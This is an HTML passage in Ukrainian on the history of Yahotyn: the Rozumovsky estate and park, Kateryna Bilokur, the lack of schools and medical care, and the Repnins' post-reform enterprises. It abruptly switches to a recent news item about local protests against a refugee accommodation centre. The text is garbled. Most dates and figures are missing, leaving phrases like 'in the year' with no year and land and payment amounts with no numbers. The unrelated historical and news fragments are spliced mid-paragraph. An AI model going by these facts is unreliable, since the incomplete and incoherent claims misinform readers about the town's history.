	<p>При О. Розумовському маєток було перебудовано та насаджено парк. Від великої садиби до нашого часу збереглися залишки розкішного парку та один з корпусів палацу кінця 18 — початку 19 ст. Широко представлені твори народної художниці Катерини Білокур, яка прославила яготинську землю на весь світ. За даними року, школи в Яготині не було, парафіяльне училище було в Жоравці, а повітове — у Пирятині. На стан освіти яготинців ніяк не вплинуло те, що граф К. Розумовський був президентом імператорської академії наук, а його син Олексій — міністром народної освіти — pp. Недоступною для селян була багата панська бібліотека.</p>
<p>Уже згадуваний Отто фон Гун писав і про нестачу медичної допомоги в Яготині. Становище істотно не змінювалося і в наступні роки. Під час реформи року селянам Яготина наділено десятин землі, за що вони сплачували щорічно карбованців.</p><a id='c4'></a><h3>Дізналися зі ЗМІ</h3><p>У пореформений період в містечку зростає торгівля і він стає одним із центрів торгівлі Пирятинського повіту — «багатолюдним і торговельним містечком». Щорічно збиралося мінімум 6 ярмарків на рік. Пристосовуючись до нових умов, все більше капіталізували своє господарство поміщики Рєпніни. У 60—х роках у їхньому маєтку діяла фабрика льняного прядива. Продукція збувалася як на місцевому ринку, так і за кордоном. На кінному заводі розводилися напівпородисті англійські коні; на тваринницьких фермах — велика рогата худоба, каракулеві вівці, свині; на озерах і ставках — тисячі гусей і качок.</p>
<p>Збагачувалася і сільська буржуазія. У року заможний селянин І. Перша черга комплексу розрахована на ліжко-місце. Останніми днями в Яготині часто проходять протестні акції та народні віче — люди проти того, щоб у їхньому місті відкрився пункт тимчасового розміщення біженців. Будівництво комплексу розпочалося у році, а от про його призначення місцеві дізналися лише нещодавно.</p>
		
